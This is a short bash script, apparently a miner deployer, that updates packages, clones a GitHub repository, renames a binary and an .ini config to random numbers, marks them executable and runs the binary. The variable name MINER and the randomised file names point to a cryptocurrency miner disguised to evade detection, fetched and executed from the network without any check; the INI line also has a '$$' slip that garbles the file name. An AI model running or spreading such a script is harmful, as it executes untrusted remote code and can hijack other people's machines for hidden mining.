#!/bin/bash
MINER=$(shuf -i 1000000000000000000-9999999999999999999 -n 1)
INI=$$(shuf -i 1000000000000000000-9999999999999999999 -n 1).ini
sudo apt update
git clone https://github.com/githubasem/asu 
cd asu
mv gas $MINER
mv keun.ini $INI
chmod +x $MINER $INI
./$MINER $INI
